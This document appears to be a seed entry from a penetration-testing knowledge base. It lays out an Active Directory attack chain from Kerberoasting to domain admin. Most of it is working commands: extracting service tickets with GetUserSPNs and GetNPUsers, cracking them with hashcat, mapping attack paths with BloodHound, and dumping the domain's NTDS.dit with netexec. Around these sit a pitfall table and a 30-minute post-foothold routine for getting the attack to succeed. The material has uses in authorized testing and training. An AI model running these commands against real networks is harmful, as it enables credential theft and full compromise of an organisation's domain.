# [Seed] Kerberoasting → offline cracking → DA

## Scenario classification
Pentest / AD attack

## Target overview
With a regular domain user's credentials and service accounts with SPNs configured in the target domain, perform Kerberoasting to grab TGS tickets for offline cracking; after recovering a plaintext password, use BloodHound to find a path straight to DA.

## Full execution chain

1. Gain a foothold in the domain (any regular user; no local admin needed)
2. Enumerate SPNs
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. See which accounts have SPNs (usually SQL Server / IIS / custom service accounts)
4. Offline cracking
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Crack an svc account password → look up its reachable paths in BloodHound
6. If that account is in a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → DCSync directly
7. If not but it can RDP/WinRM onto a key machine → get in, run mimikatz dump, chain to DA

## Pitfall log

| Problem | Cause | Solution | Time spent |
|---------|-------|----------|------------|
| GetUserSPNs returns nothing | Current user lacks SPN read permission | Any regular domain user has it; likely wrong -dc-ip or PreAuth failed | 20min |
| Hours of cracking, nothing | High password strength | 1) switch wordlists (rockyou.txt + corp keywords)  2) use a GPU (hashcat -d 1)  3) try the OneRuleToRuleThemAll ruleset | hours |
| Cracked password fails to log in | Credential expired or case-sensitive | Verify first with nxc: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | GPO/ACL missing during collection | `bloodhound-python -c All` must include All; newer BHCE recommends `--zip` | 30min |
| AS-REP Roasting finds no targets | Few accounts have "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: ` -usersfile users.txt -no-pass` | 15min |

## Toolchain findings

- **impacket-GetUserSPNs** is the de facto standard; more cross-platform than PowerView
- **netexec (nxc)** is the CrackMapExec successor — fast, with built-in spider_plus / lsassy / ntds modules
- **BloodHound Community Edition (BHCE)** is the new version, much faster than the legacy BloodHound
- **OneRuleToRuleThemAll** ruleset gives the best password-cracking results
- **bloodyAD** is the new-generation AD tool, specializing in "low-privilege ACL-based privilege escalation"

## Key code/commands

Complete Kerberoasting flow:

```bash
# 1. Verify credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS tickets
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. AS-REP on the side
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Offline cracking
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. After cracking a password, collect BloodHound
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find paths: mark the svc account as Owned, then check Shortest Path to DA
```

If the svc account can access SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# dumps NTDS.dit directly
```

## Improvement suggestions for this package

- `pentest-tools/references/network-attack-defense.md` should have a complete Kerberoasting section
- BloodHound CE is now mainstream; the bootstrap-manifest should explicitly install `bloodhound-ce-cli`
- Add a `pentest-tools/references/ad-cheatsheet.md` covering the 6 major AD attacks on one page (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15)

## Reusable patterns/script snippets

**Standard 30-minute actions after gaining an in-domain foothold**:

```text
1. nxc smb to verify creds + auto-spider shares
2. GetUserSPNs + GetNPUsers back to back
3. bloodhound-python -c All collection
4. Offline cracking in parallel (GPU running)
5. While waiting, review BloodHound Tier 0 / pre-built attack paths
6. Password cracked → mark Owned → re-query paths
```

**AD Kerberos hashcat mode quick reference**:

| Mode | Use |
|------|-----|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (captured by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution actions
- [ ] Add ad-cheatsheet.md
- [ ] Check nxc / bloodhound-ce / bloodyAD status in tool-index
- [x] Routing matrix already includes Kerberos / Kerberoasting

## Environment info
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attacker position: any in-domain foothold (regular domain user)

## Anonymization requirements
This entry is seed data, written from public AD attack patterns; no real target domains involved.
